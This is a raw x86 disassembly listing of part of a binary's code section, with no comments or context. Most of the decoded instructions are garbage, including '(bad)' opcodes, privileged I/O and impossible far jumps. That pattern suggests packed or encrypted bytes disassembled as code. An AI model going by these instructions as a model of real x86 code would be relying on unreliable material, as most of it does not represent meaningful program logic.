  402070:	fstp   QWORD PTR ds:0xf747ed4e
  402076:	mov    cl,0x46
  402078:	xchg   edi,eax
  402079:	and    DWORD PTR [edi],esi
  40207b:	nop
  40207c:	stos   BYTE PTR es:[edi],al
  40207d:	ficom  WORD PTR [eax]
  40207f:	mov    WORD PTR [ebx],cs
  402081:	lods   eax,DWORD PTR ds:[esi]
  402082:	mov    ecx,0xf3511669
  402087:	fisub  WORD PTR [ecx+0x5a]
  40208a:	xor    al,0xfe
  40208c:	cmp    edi,DWORD PTR [esi]
  40208e:	call   0x2195:0x78835fb5
  402095:	call   DWORD PTR [edi+edi*4+0x1d]
  402099:	shl    DWORD PTR [ecx*1-0x29fe784d],0x2b
  4020a1:	icebp  
  4020a2:	push   edi
  4020a3:	push   eax
  4020a4:	cmp    eax,0x390b1b46
  4020a9:	pop    ds
  4020aa:	scas   eax,DWORD PTR es:[edi]
  4020ab:	daa    
  4020ac:	fadd   st,st(5)
  4020ae:	push   cs
  4020af:	dec    esi
  4020b0:	jp     0x40212f
  4020b2:	adc    al,0x66
  4020b4:	lea    ecx,[eax-0x65]
  4020b7:	pop    ebp
  4020b8:	mov    ds:0x5aa1e2cc,eax
  4020bd:	fisubr WORD PTR [ecx-0x603aa847]
  4020c3:	js     0x40204a
  4020c5:	dec    ebx
  4020c6:	sti    
  4020c7:	data16 mov ch,0x4a
  4020ca:	js     0x4020ce
  4020cc:	sbb    esp,DWORD PTR [ecx]
  4020ce:	sbb    BYTE PTR [ebp+0x1e],bl
  4020d1:	add    al,0x53
  4020d3:	push   eax
  4020d4:	das    
  4020d5:	dec    edi
  4020d6:	xlat   BYTE PTR es:[ebx]
  4020d8:	ja     0x402155
  4020da:	jg     0x40209c
  4020dc:	ret    
  4020dd:	pop    ebp
  4020de:	push   ds
  4020df:	xlat   BYTE PTR ds:[ebx]
  4020e0:	js     0x4020f5
  4020e2:	xor    dl,BYTE PTR [eax]
  4020e4:	retf   
  4020e5:	aas    
  4020e6:	dec    ebx
  4020e7:	lods   eax,DWORD PTR ds:[esi]
  4020e8:	scas   eax,DWORD PTR es:[edi]
  4020e9:	dec    ecx
  4020ea:	dec    edx
  4020eb:	sti    
  4020ec:	mov    esp,0x3b225cba
  4020f1:	push   0x10
  4020f3:	cmp    BYTE PTR [edx-0x6],0x6e
  4020f7:	fwait
  4020f8:	enter  0xa3b8,0xfd
  4020fc:	leave  
  4020fd:	inc    eax
  4020fe:	jae    0x4020ca
  402100:	pop    es
  402101:	mov    bh,0xff
  402103:	sti    
  402104:	jnp    0x402173
  402106:	jmp    edx
  402108:	and    cl,bh
  40210a:	mov    ch,0x10
  40210c:	inc    ebp
  40210d:	in     al,0x74
  40210f:	cmc    
  402110:	xor    eax,esp
  402112:	stos   BYTE PTR es:[edi],al
  402113:	cwde   
  402114:	das    
  402115:	jp     0x402182
  402117:	mov    ds:0xc039daf9,eax
  40211c:	jg     0x4020fd
  40211e:	test   eax,0xfc1f7b0a
  402123:	push   esp
  402124:	data16 xchg BYTE PTR [ebx],bh
  402127:	or     dl,BYTE PTR [ebx+0x9780fe5]
  40212d:	xchg   edx,eax
  40212e:	(bad)  
  40212f:	inc    edx
  402130:	xchg   ebp,eax
  402131:	outs   dx,DWORD PTR ds:[esi]
  402132:	ud1    ebx,ebx
  402135:	sar    ebp,0x13
  402138:	pop    ss
  402139:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40213a:	add    ax,0xa5c
  40213e:	scas   eax,DWORD PTR es:[edi]
  40213f:	arpl   WORD PTR [ebp+0x3b3f783d],dx
  402145:	cs push esp
  402147:	div    DWORD PTR [edx-0x35bb104d]
  40214d:	(bad)
  402150:	or     esp,DWORD PTR [esi+0x511cea0c]
  402156:	popa   
  402157:	mov    esi,0x867263a6
  40215c:	mov    ebx,0x4a098fff
  402161:	dec    eax
  402162:	int3   
  402163:	pop    ebx
  402164:	mov    bl,0x4f
  402166:	lock pop ss
  402168:	nop
  402169:	and    al,0x61
  40216b:	inc    ebp
  40216c:	jecxz  0x4021d9
  40216e:	cmp    DWORD PTR [eax-0x705e4db8],0xffffffe3
  402175:	cdq    
  402176:	mov    gs,WORD PTR [eax+0x3]
  402179:	pop    edx
  40217a:	ror    BYTE PTR [esi+eiz*1],cl
  40217d:	xchg   BYTE PTR [ecx+0x46a3cd9c],dl
  402183:	add    edi,DWORD PTR [ebp-0x639701b]
  402189:	out    0x40,eax
  40218b:	jecxz  0x4021dd
  40218d:	mov    ebx,0xc743ab52
  402192:	imul   edi,DWORD PTR [eax+eax*4+0x71c1d1fc],0xffffff96
  40219a:	cmp    DWORD PTR [ebp-0x38baae88],0x3c
  4021a1:	and    ecx,0x60
  4021a4:	mov    dh,0xb8
  4021a6:	bound  ecx,QWORD PTR [eax]
  4021a8:	mov    ds:0xf23ad51d,eax
  4021ad:	and    eax,0x1e3e763b
  4021b2:	lods   al,BYTE PTR fs:[esi]
  4021b4:	pop    ss
  4021b5:	aaa    
  4021b6:	hlt    
  4021b7:	mov    ds:0xe4a4c2e9,eax
  4021bc:	add    esi,ebp
  4021be:	cmc    
  4021bf:	jo     0x4021f7
  4021c1:	call   DWORD PTR [esi+0x73b5f418]
  4021c7:	shl    BYTE PTR fs:[esp+esi*1],cl
  4021cb:	adc    eax,0x72b0bf2c
  4021d0:	out    0x0,eax
  4021d2:	xchg   esp,eax
  4021d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021d4:	fdivr  st(7),st
  4021d6:	scas   eax,DWORD PTR es:[edi]
  4021d7:	addr16 cmp dl,ch
  4021da:	sub    al,0x5
  4021dc:	into   
  4021dd:	rol    DWORD PTR [edx+0x33],cl
  4021e0:	sbb    eax,0xbabecd6f
  4021e5:	and    BYTE PTR gs:[edx+0x74],cl
  4021e9:	jnp    0x402199
  4021eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021ec:	lods   eax,DWORD PTR ds:[esi]
  4021ed:	js     0x402182
  4021ef:	xchg   ebx,eax
  4021f0:	std    
  4021f1:	je     0x40224e
  4021f3:	nop
  4021f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021f5:	psubq  mm6,QWORD PTR [esi+ebx*1]
  4021f9:	out    dx,eax
  4021fa:	stc    
  4021fb:	cmp    al,0x96
  4021fd:	sbb    DWORD PTR [esi-0xf28abb8],0xffffffb3
  402204:	add    DWORD PTR [esi],eax
  402206:	sub    eax,0x5273e6b4
  40220b:	in     al,0x66
  40220d:	or     ah,BYTE PTR [ecx-0x7085055c]
  402213:	repnz adc eax,0xf73929af
  402219:	std    
  40221a:	push   ss
  40221b:	jmp    0x128b:0x53fe7fa0
  402222:	push   edi
  402223:	mov    ?,WORD PTR [edi+edi*4-0x114ad2c2]
  40222a:	inc    esp
  40222b:	xchg   edi,eax
  40222c:	lods   eax,DWORD PTR ds:[esi]
  40222d:	adc    dh,BYTE PTR ds:0x666d23a3
  402233:	mov    ah,0x81
  402235:	enter  0xff82,0xbb
  402239:	clc    
  40223a:	sahf   
  40223b:	in     eax,dx
  40223c:	lds    edi,FWORD PTR [ecx+edx*4-0x60]
  402240:	mov    esi,0x2efdf328
  402245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402246:	jno    0x40223d
  402248:	xor    DWORD PTR [ecx+esi*4-0x1c],esi
  40224c:	or     eax,0x7031314d
  402251:	add    ebp,DWORD PTR [edx+0x3f]
  402254:	cmp    edx,DWORD PTR [edi]
  402256:	jo     0x40225a
  402258:	mov    cl,0x11
  40225a:	imul   eax,DWORD PTR [esi-0xa],0x8
  40225e:	cmc    
  40225f:	test   BYTE PTR [ebp-0x65],dl
  402262:	dec    DWORD PTR [eax+0x3ecce36]
  402268:	push   ebp
  402269:	sbb    eax,0x7a712ce
  40226e:	jb     0x40229f
  402270:	imul   ecx,ebp,0xd4c9158e
  402276:	pop    esi
  402277:	mov    DWORD PTR [esi],edx
  402279:	stc    
  40227a:	aaa    
  40227b:	scas   al,BYTE PTR es:[edi]
  40227c:	xor    bh,BYTE PTR [ebx+ebp*8]
  40227f:	outs   dx,DWORD PTR ds:[esi]
  402280:	push   0xffffffbd
  402282:	jo     0x402229
  402284:	out    dx,al
  402285:	add    dl,BYTE PTR [esi]
  402287:	dec    edx
  402288:	push   esi
  402289:	popa   
  40228a:	xchg   BYTE PTR [edi+0x41b2f588],dh
  402290:	sar    DWORD PTR [ecx],0x35
  402293:	mov    ebx,DWORD PTR [eax-0x30ef801f]
  402299:	test   DWORD PTR [esi+0x2f],0x8c76bc64
  4022a0:	mov    ds:0xfc011a59,al
  4022a5:	xor    eax,esi
  4022a7:	and    DWORD PTR ds:0x42a771,0x42a7b5
  4022b1:	add    eax,edi
  4022b3:	cmp    DWORD PTR [ecx],eax
  4022b5:	jne    0x402dc8
  4022bb:	mov    eax,DWORD PTR [ebp+0x8]
  4022be:	mov    ecx,DWORD PTR [ebp-0x18]
  4022c1:	sbb    DWORD PTR ds:0x42a835,0x2700
  4022cb:	xor    eax,esi
  4022cd:	add    eax,edi
  4022cf:	jmp    0x40256e
  4022d4:	xlat   BYTE PTR ds:[ebx]
  4022d5:	cmp    eax,0xd9d5d1c7
  4022da:	fxch   st(1)
  4022dc:	mov    edi,0xcf682c5b
  4022e1:	scas   eax,DWORD PTR es:[edi]
  4022e2:	shr    DWORD PTR [edi],1
  4022e4:	add    al,0x9
  4022e6:	js     0x402360
  4022e8:	(bad)  
  4022e9:	jle    0x402363
  4022eb:	js     0x402298
  4022ed:	xor    al,0xd0
  4022ef:	jecxz  0x4022b0
  4022f1:	adc    esp,ebp
  4022f3:	imul   esi,DWORD PTR [ebx+0x1a],0x11
  4022f7:	imul   BYTE PTR es:[edi-0x34]
  4022fb:	int3   
  4022fc:	idiv   DWORD PTR [eax]
  4022fe:	and    ebx,ebx
  402300:	mov    ds:0x8330a73a,al
  402305:	outs   dx,BYTE PTR ds:[esi]
  402306:	or     esi,DWORD PTR [ebx-0x69]
  402309:	sti    
  40230a:	or     BYTE PTR [ebx-0x2cdb0f1e],bl
  402310:	jg     0x4022b0
  402312:	(bad)  
  402313:	arpl   WORD PTR [ebx+edi*8],cx
  402316:	retf   
  402317:	push   ds
  402318:	cs cmp eax,0x201db1d5
  40231e:	(bad)
  402321:	addr16 jbe 0x4022c0
  402324:	aas    
  402325:	sbb    DWORD PTR [esi-0x5f1fe7ad],ebp
  40232b:	inc    ebx
  40232c:	js     0x40237a
  40232e:	ret    0xb04d
  402331:	test   DWORD PTR [ecx],0x2803c18
  402337:	mov    WORD PTR [eax-0x1b96728c],gs
  40233d:	(bad)  [esp+edi*8+0x2c5349b]
  402344:	js     0x4022c7
  402346:	ds pop esp
  402348:	sahf   
  402349:	scas   eax,DWORD PTR es:[edi]
  40234a:	lock hlt 
  40234c:	cld    
  40234d:	repnz xchg ecx,eax
  40234f:	mov    esi,0xaa4671f6
  402354:	add    BYTE PTR [ebp+0x36],ch
  402357:	aam    0xa0
  402359:	leave  
  40235a:	es scas al,BYTE PTR es:[edi]
  40235c:	cdq    
  40235d:	pop    esp
  40235e:	js     0x40235c
  402360:	test   BYTE PTR [ebx+0x5a],dl
  402363:	fnstenv [edi+0x660e8ada]
  402369:	inc    edi
  40236a:	cld    
  40236b:	cmp    esi,esi
  40236d:	or     dh,BYTE PTR [ebx-0x50]
  402370:	bound  eax,QWORD PTR [edx]
  402372:	cwde   
  402373:	jb     0x4023c5
  402375:	out    dx,eax
  402376:	mov    bh,0x52
  402378:	jbe    0x402341
  40237a:	xchg   ebp,eax
  40237b:	les    eax,FWORD PTR [ecx]
  40237d:	lds    esi,FWORD PTR [ebx-0x64]
  402380:	push   ds
  402381:	ja     0x40232b
  402383:	xchg   ah,bl
  402385:	ret    
  402386:	pusha  
  402387:	mov    esp,0x95fcc863
  40238c:	adc    ebx,esi
  40238e:	mov    ebp,0x50679bd6
  402393:	xchg   edi,eax
  402394:	jmp    0x5a73:0xe2c9bd0c
  40239b:	std    
  40239c:	xchg   esp,eax
  40239d:	pop    esp
  40239e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40239f:	jge    0x4023f1
  4023a1:	cmp    DWORD PTR [ebx],edi
  4023a3:	inc    eax
  4023a4:	loop   0x402354
  4023a6:	inc    eax
  4023a7:	or     BYTE PTR [eax],cl
  4023a9:	jns    0x4023d4
  4023ab:	mov    ds:0x7cdef359,al
  4023b0:	sar    BYTE PTR [eax-0x7e760679],0x49
  4023b7:	xor    BYTE PTR ds:[ebx-0x2a],cl
  4023bb:	retf   
  4023bc:	adc    ecx,ecx
  4023be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023bf:	add    esp,ebp
  4023c1:	ret    
  4023c2:	ret    0x7b71
  4023c5:	inc    ebx
  4023c6:	mov    dl,0x7e
  4023c8:	mov    ds:0x556a931a,eax
  4023cd:	(bad)  
  4023cf:	out    0x92,al
  4023d1:	add    eax,edx
  4023d3:	test   DWORD PTR [ebx+edx*8+0x6a],ebp
  4023d7:	gs ins BYTE PTR es:[edi],dx
  4023d9:	inc    esp
  4023da:	fldenv [edi-0x21f632e]
  4023e0:	adc    al,0xcd
  4023e2:	push   ebx
  4023e3:	ficomp WORD PTR [ebp-0x1b1e8b]
  4023e9:	jmp    0x4ac9c445
  4023ee:	mov    cs,edi
  4023f0:	xchg   esi,eax
  4023f1:	mov    edi,esi
  4023f3:	pop    esi
  4023f4:	call   0x23823b36
  4023f9:	sbb    DWORD PTR [eax+eiz*2+0x51],edi
  4023fd:	adc    al,0x2c
  4023ff:	dec    ebp
  402400:	rol    BYTE PTR [esi-0x7e],1
  402403:	adc    BYTE PTR [edx+0x5a3ff566],bh
  402409:	sub    dh,dh
  40240b:	mov    al,0x58
  40240d:	das    
  40240e:	loop   0x402447
  402410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402411:	inc    ecx
  402412:	dec    edx
  402413:	mov    dh,0x5
  402415:	push   ss
  402416:	int3   
  402417:	push   esi
  402418:	test   DWORD PTR [ebx+0x77],ebx
  40241b:	fmul   QWORD PTR [edx]
  40241d:	hlt    
  40241e:	fisub  WORD PTR [esi+edi*1-0xc5fb47d]
  402425:	sub    eax,0x10bebb44
  40242a:	into   
  40242b:	loope  0x402454
  40242d:	jp     0x402496
  40242f:	cmp    eax,0x50f83ff5
  402434:	sahf   
  402435:	push   esp
  402436:	inc    esi
  402437:	mov    ds:0x8e6bcbd0,al
  40243c:	mov    edx,0x4e08626
  402441:	pop    ecx
  402442:	das    
  402443:	adc    edi,DWORD PTR [ecx]
  402445:	jo     0x4023d0
  402447:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  402449:	jb     0x402463
  40244b:	xchg   esp,eax
  40244c:	jle    0x402451
  40244e:	cwde   
  40244f:	pop    ebx
  402450:	mov    al,ds:0xb1389a64
  402455:	mov    ebp,0x7fde034f
  40245a:	xor    edx,esi
  40245c:	arpl   si,di
  40245e:	retf   
  40245f:	sbb    DWORD PTR [eax+0x5d],esp
  402462:	inc    edi
  402463:	lahf   
  402464:	scas   eax,DWORD PTR es:[edi]
  402465:	popf   
  402466:	repz jnp 0x402461
  402469:	leave  
  40246a:	in     eax,0xbc
  40246c:	sbb    eax,0x55406cd1
  402471:	imul   edx,DWORD PTR [ebp+0x73],0xffffffe9
  402475:	stos   BYTE PTR es:[edi],al
  402476:	loopne 0x402467
  402478:	xchg   esi,eax
  402479:	rcl    ecx,1
  40247b:	or     DWORD PTR [esp+edx*2-0x6a8ab00],ebx
  402482:	add    bh,bl
  402484:	adc    DWORD PTR [ecx+0x58b367df],ebp
  40248a:	or     bh,BYTE PTR [eax]
  40248c:	push   ebp
  40248d:	ins    DWORD PTR es:[edi],dx
  40248e:	ins    BYTE PTR es:[edi],dx
  40248f:	sub    al,0x92
  402491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402492:	inc    edi
  402493:	xor    BYTE PTR [ebx-0x75e77fa3],0x85
  40249a:	xchg   ebx,eax
  40249b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40249c:	jmp    FWORD PTR [ebx+0x41]
  40249f:	div    ecx
  4024a1:	jl     0x40249f
  4024a3:	pop    ebp
  4024a4:	xor    dl,dh
  4024a6:	mov    edx,0x4afb72a
  4024ab:	pop    ebp
  4024ac:	jno    0x4024bc
  4024ae:	push   edx
  4024af:	in     al,0x54
  4024b1:	sbb    DWORD PTR [ecx+0x69],edi
  4024b4:	mov    edi,0x8bc7a8dc
  4024b9:	mov    bl,0xba
  4024bb:	mov    ds:0xadbfb567,eax
  4024c0:	stos   DWORD PTR es:[edi],eax
  4024c1:	mov    edx,0x69c26cbe
  4024c6:	out    0xd3,eax
  4024c8:	push   ebx
  4024c9:	dec    eax
  4024ca:	push   ebp
  4024cb:	les    eax,FWORD PTR [esi+0x11]
  4024ce:	test   BYTE PTR [edi+0x4a],0x1c
  4024d2:	mov    al,0x23
  4024d4:	sti    
  4024d5:	mov    ds:0x900c2ee6,al
  4024da:	ins    BYTE PTR es:[edi],dx
  4024db:	sbb    eax,0xf9535bc0
  4024e0:	pop    ecx
  4024e1:	jecxz  0x4024ab
  4024e3:	mov    ah,0x68
  4024e5:	scas   al,BYTE PTR es:[edi]
  4024e6:	push   cs
  4024e7:	dec    ecx
  4024e8:	pop    ss
  4024e9:	ror    DWORD PTR [edi],cl
  4024eb:	mov    BYTE PTR fs:[edx+0x4d],bl
  4024ef:	pop    eax
  4024f0:	mov    ds:0x1412fb5a,al
  4024f5:	and    BYTE PTR [ebx-0x3b],dh
  4024f8:	xlat   BYTE PTR ds:[ebx]
  4024f9:	scas   eax,DWORD PTR es:[edi]
  4024fa:	inc    ecx
  4024fb:	in     al,dx
  4024fc:	mov    esi,0xa147621d
  402501:	and    DWORD PTR [ecx-0x9],edi
  402504:	dec    esi
  402505:	pop    es
  402506:	(bad)  
  402507:	push   esi
  402508:	pop    esi
  402509:	hlt    
  40250a:	idiv   BYTE PTR [eax]
  40250c:	adc    eax,0x3bd5b358
  402511:	lahf   
  402512:	mov    al,ds:0x27e5c4
  402517:	jg     0x40256c
  402519:	(bad)  
  40251a:	jmp    0x1f0e:0xb7ed9c2c
  402521:	stc    
  402522:	test   DWORD PTR [ecx+0x30],0x2d2a9b10
  402529:	loope  0x402537
  40252b:	push   eax
  40252c:	rcr    BYTE PTR [ebx-0x13],1
  40252f:	(bad)  
  402530:	jnp    0x402585
  402532:	in     al,0x55
  402534:	test   BYTE PTR [edx+0x28],cl
  402537:	sub    al,0xc
  402539:	push   cs
  40253a:	popa   
  40253b:	loope  0x402577
  40253d:	rcl    BYTE PTR [ebx-0x41],1
  402540:	data16 fiadd WORD PTR [esi-0x5bc8c80]
  402547:	test   BYTE PTR ds:0xcb396077,0x26
  40254e:	cmp    BYTE PTR [ebx],bh
  402550:	mov    DWORD PTR [eax+0x79],edx
  402553:	mov    al,0xe4
  402555:	adc    cl,BYTE PTR [ebp-0x211dc430]
  40255b:	xor    eax,0x651a74d1
  402560:	test   al,0x1d
  402562:	mov    esi,0x161ae246
  402567:	fiadd  WORD PTR [edi+edx*8+0x6def9c23]
  40256e:	cmp    DWORD PTR [ecx],eax
  402570:	jne    0x402832
  402576:	mov    eax,DWORD PTR [ebp+0x8]
  402579:	mov    ecx,DWORD PTR [ebp-0x10]
  40257c:	xor    eax,esi
  40257e:	add    eax,edi
  402580:	mov    DWORD PTR [ecx],eax
  402582:	jmp    0x402821
  402587:	aas    
  402588:	retf   
  402589:	ret    0xcace
  40258c:	aad    0xd3
  40258e:	fld    DWORD PTR [ecx+eiz*1+0x26]
  402592:	inc    edx
  402593:	test   al,0x82
  402595:	cmc    
  402596:	add    ecx,DWORD PTR [edx-0x18787f1]
  40259c:	jle    0x402616
  40259e:	js     0x4025ae
  4025a0:	loop   0x402570
  4025a2:	cmp    DWORD PTR [edx+0x6d],ebp
  4025a5:	mov    esi,0xaebf0c6b
  4025aa:	jne    0x40256b
  4025ac:	in     al,0x59
  4025ae:	and    al,0x81
  4025b0:	mov    al,0x46
  4025b2:	stos   BYTE PTR es:[edi],al
  4025b3:	push   0x7bf7946b
  4025b8:	cmp    bl,BYTE PTR [ebx+0xb816599]
  4025be:	jbe    0x4025b4
  4025c0:	rol    BYTE PTR [ebx-0xb957f3e],0xbc
  4025c7:	cld    
  4025c8:	stos   DWORD PTR es:[edi],eax
  4025c9:	sub    al,ah
  4025cb:	fcmovbe st,st(3)
  4025cd:	shr    BYTE PTR ds:0x2bfaf66d,1
  4025d3:	pop    ebp
  4025d4:	dec    DWORD PTR [esi]
  4025d6:	imul   eax,DWORD PTR [ecx-0x197da7f8],0x13
  4025dd:	fldenv [edi]
  4025df:	jle    0x402619
  4025e1:	mov    DWORD PTR [ecx+edx*8],eax
  4025e4:	aam    0x3c
  4025e6:	je     0x402601
  4025e8:	mov    ch,0x91
  4025ea:	popa   
  4025eb:	out    0x11,eax
  4025ed:	cmp    DWORD PTR [ecx+0x1f],ebx
  4025f0:	aad    0xd9
  4025f2:	ficomp DWORD PTR [ebx+ebp*2-0x7d]
  4025f6:	jmp    0x809b:0xffa1
  4025fc:	rol    DWORD PTR [esi+esi*8-0x38],0xe0
  402601:	ret    0x1af9
  402604:	sub    ebp,DWORD PTR [edi+ebx*8]
  402607:	xchg   ebx,eax
  402608:	xchg   ebp,eax
  402609:	xor    ecx,DWORD PTR [ecx-0x23]
  40260c:	dec    ecx
  40260d:	mov    ds:0x33ba1b81,al
  402612:	push   cs
  402613:	pop    edi
  402614:	pop    ebx
  402615:	rol    DWORD PTR [esi],cl
  402617:	inc    esi
  402618:	sub    dl,ah
  40261a:	mov    ebx,0x8d945950
  40261f:	rcr    BYTE PTR [ebx+eiz*4-0x7a],0x9a
  402624:	fs mov dh,0x3c
  402627:	fwait
  402628:	pop    edx
  402629:	mov    eax,ds:0x1672d1e6
  40262e:	nop
  40262f:	inc    esp
  402630:	jmp    esi
  402632:	lahf   
  402633:	xor    bh,ch
  402635:	lods   al,BYTE PTR ds:[esi]
  402636:	mov    ah,0x48
  402638:	add    al,0x9e
  40263a:	arpl   WORD PTR [edx+0x66],cx
  40263d:	dec    eax
  40263e:	aam    0x60
  402640:	popf   
  402641:	scas   al,BYTE PTR es:[edi]
  402642:	pop    ecx
  402643:	cmp    ecx,ecx
  402645:	and    al,0xaf
  402647:	jle    0x4026a7
  402649:	pusha  
  40264a:	aas    
  40264b:	mov    ebx,0x1e974da6
  402650:	mov    bh,0xbc
  402652:	aas    
  402653:	es ins BYTE PTR es:[edi],dx
  402655:	cld    
  402656:	retf   0x48b8
  402659:	add    BYTE PTR [ecx-0x12],dl
  40265c:	fidiv  WORD PTR [esi-0x631ebce9]
  402662:	ror    BYTE PTR [edx-0x1d5a7bb1],1
  402668:	mov    esp,0x426bb82c
  40266d:	repnz dec esp
  40266f:	dec    esp
  402670:	dec    esi
  402671:	push   0x2
  402673:	(bad)  
  402674:	pop    edx
  402675:	mov    edi,0xbce99910
  40267a:	xlat   BYTE PTR ds:[ebx]
  40267b:	inc    esp
  40267c:	mov    eax,0x5083d722
  402681:	sbb    DWORD PTR [esp+ebx*4+0x487499d3],esp
  402688:	dec    edi
  402689:	setp   BYTE PTR [edx]
  40268c:	stos   DWORD PTR es:[edi],eax
  40268d:	sbb    dl,BYTE PTR [esi-0x16]
  402690:	lods   eax,DWORD PTR ds:[esi]
  402691:	in     al,0xc3
  402693:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402694:	jle    0x40268b
  402696:	mov    ebx,0x7d4dd12a
  40269b:	mov    ecx,0xe60d09c1
  4026a0:	fs and al,0x8c
  4026a3:	ror    DWORD PTR [ebx],cl
  4026a5:	cmp    cl,BYTE PTR [ebp+0x3b25942c]
  4026ab:	mov    esp,0xbf11740e
  4026b0:	dec    edx
  4026b1:	adc    ecx,esp
  4026b3:	jo     0x402660
  4026b5:	jle    0x402712
  4026b7:	push   esp
  4026b8:	or     ah,bl
  4026ba:	pop    ebp
  4026bb:	jne    0x4026c7
  4026bd:	dec    edi
  4026be:	(bad)  [ebx]
  4026c0:	mov    dh,0x29
  4026c2:	int    0xf8
  4026c4:	jae    0x402649
  4026c6:	dec    ecx
  4026c8:	fdivr  DWORD PTR [edx+0x179e7060]
  4026ce:	xchg   BYTE PTR [ebx+edx*8-0x1c],ch
  4026d2:	cwde   
  4026d3:	pushf  
  4026d4:	in     eax,0x5c
  4026d6:	popf   
  4026d7:	sbb    BYTE PTR [ebx],0x23
  4026da:	mov    bl,BYTE PTR [esi-0x26]
  4026dd:	cmc    
  4026de:	cmp    esp,esp
  4026e0:	adc    esi,ebp
  4026e2:	mov    bh,BYTE PTR [eax]
  4026e4:	int3   
  4026e5:	cli    
  4026e6:	test   BYTE PTR [esi+0x64d67f8e],cl
  4026ec:	fxtract 
  4026ee:	xchg   ecx,eax
  4026ef:	fisttp QWORD PTR [ebp-0x58]
  4026f2:	mov    ds:0x9ec3b8d7,al
  4026f7:	js     0x4026e0
  4026f9:	push   edi
  4026fa:	test   eax,0x1966dab7
  4026ff:	xchg   esi,eax
  402700:	jb     0x402697
  402702:	adc    ebx,esp
  402704:	mov    ebp,DWORD PTR [edx-0x31]
  402707:	inc    eax
  402708:	cmp    eax,0x80e030ad
  40270d:	add    BYTE PTR [edi-0x5b],0xa2
  402711:	pop    edi
  402712:	sub    al,0xcf
  402714:	rol    esi,1
  402716:	mov    ah,0x92
  402718:	ins    BYTE PTR es:[edi],dx
  402719:	gs mov gs:0x49fa3a5,eax
  402720:	xor    al,BYTE PTR [edi-0xb]
  402723:	fidivr DWORD PTR [edi-0x257fa00e]
  402729:	inc    edx
  40272a:	mov    ds:0xcf805f55,al
  40272f:	xchg   ebp,eax
  402730:	xor    BYTE PTR [edx],dl
  402732:	xor    eax,0x68cc656a
  402737:	jne    0x402717
  402739:	nop
  40273a:	js     0x402780
  40273c:	out    dx,al
  40273d:	nop
  40273e:	xor    eax,0x482dd173
  402743:	out    dx,eax
  402744:	sub    dl,BYTE PTR ds:0xceb9a1a6
  40274a:	pop    eax
  40274b:	popf   
  40274c:	rcr    bh,1
  40274e:	push   esi
  40274f:	sbb    edi,DWORD PTR [ebx+0x74]
  402752:	loop   0x4027a0
  402754:	enter  0x481e,0x3c
  402758:	sar    BYTE PTR [esi-0x5665de0b],0x6f
  40275f:	rcl    DWORD PTR [ebx-0x35],1
  402762:	loop   0x4027ca
  402764:	add    BYTE PTR ds:0x551a4a8f,dl
  40276a:	pop    ss
  40276b:	xchg   ecx,eax
  40276c:	xor    eax,0x3beeb07e
  402771:	aaa    
  402772:	shr    BYTE PTR [ebx+0xc],cl
  402775:	dec    esp
  402776:	cdq    
  402777:	or     dh,BYTE PTR [edx]
  402779:	or     bh,BYTE PTR [ebp-0x67ef6d0f]
  40277f:	lock hlt 
  402781:	and    bh,dl
  402783:	dec    ebp
  402784:	sub    edx,ebx
  402786:	jp     0x4027fc
  402788:	repz adc eax,DWORD PTR [edi+0x35]
  40278c:	xchg   DWORD PTR [edx+0x7c4c82a1],edi
  402792:	dec    eax
  402793:	add    DWORD PTR [ecx],ebx
  402795:	sbb    dh,BYTE PTR [ebp-0x3eb2e723]
  40279b:	in     eax,dx
  40279c:	sub    eax,0xc3c0646f
  4027a1:	nop
  4027a2:	outs   dx,BYTE PTR ds:[esi]
  4027a3:	pushf  
  4027a4:	jecxz  0x40278b
  4027a6:	jp     0x402771
  4027a8:	sub    BYTE PTR ds:0xb8229a7,dh
  4027ae:	dec    ecx
  4027af:	xor    al,0x2e
  4027b1:	mov    al,0xfc
  4027b3:	test   BYTE PTR [ecx+0x6e2b89e1],bh
  4027b9:	push   eax
  4027ba:	(bad)  
  4027bb:	xor    eax,0x57b18ad2
  4027c0:	mov    cl,0x52
  4027c2:	cld    
  4027c3:	retf   
  4027c4:	sub    esi,ebp
  4027c6:	stos   DWORD PTR es:[edi],eax
  4027c7:	fiadd  WORD PTR [esi+0x41]
  4027ca:	sbb    eax,0x85fe3d86
  4027cf:	and    eax,0x4383b05e
  4027d4:	push   0x65325886
  4027d9:	outs   dx,BYTE PTR ds:[esi]
  4027da:	xor    al,0x1f
  4027dc:	mov    ch,0x15
  4027de:	fiadd  DWORD PTR [ebx-0x6]
  4027e1:	outs   dx,DWORD PTR ds:[esi]
  4027e2:	daa    
  4027e3:	pop    es
  4027e4:	xor    BYTE PTR [eax+0x11],0xa4
  4027e8:	in     eax,dx
  4027e9:	xlat   BYTE PTR ds:[ebx]
  4027ea:	mov    ds:0xf3d537af,al
  4027ef:	fild   DWORD PTR [ecx-0x7a]
  4027f2:	ins    BYTE PTR es:[edi],dx
  4027f3:	mov    ds:0x420745f5,eax
  4027f8:	add    al,0x4f
  4027fa:	ror    BYTE PTR [ebx-0x3d53f27e],1
  402800:	pop    ebp
  402801:	mov    WORD PTR [ecx-0x1918b8b8],es
  402807:	les    esi,FWORD PTR [esp+edx*8+0xc]
  40280b:	mov    cl,0xd5
  40280d:	xchg   esi,eax
  40280e:	jno    0x40283e
  402810:	loop   0x40288e
  402812:	mov    edi,0x1a54636b
  402817:	in     eax,dx
  402818:	ds add al,0x4
  40281b:	ins    DWORD PTR es:[edi],dx
  40281c:	mov    BYTE PTR [bx+si-0x2f],dh
  402820:	enter  0x458b,0xf0
  402824:	mov    ecx,DWORD PTR [ebp+0x10]
  402827:	xor    ecx,esi
  402829:	mov    edx,0xffcd8d68
  40282e:	sub    edx,ecx
  402830:	add    DWORD PTR [eax],edx
  402832:	mov    eax,ds:0x41ebba
  402837:	mov    eax,DWORD PTR [eax]
  402839:	mov    cx,WORD PTR [ebp-0x4]
  40283d:	movzx  ecx,cx
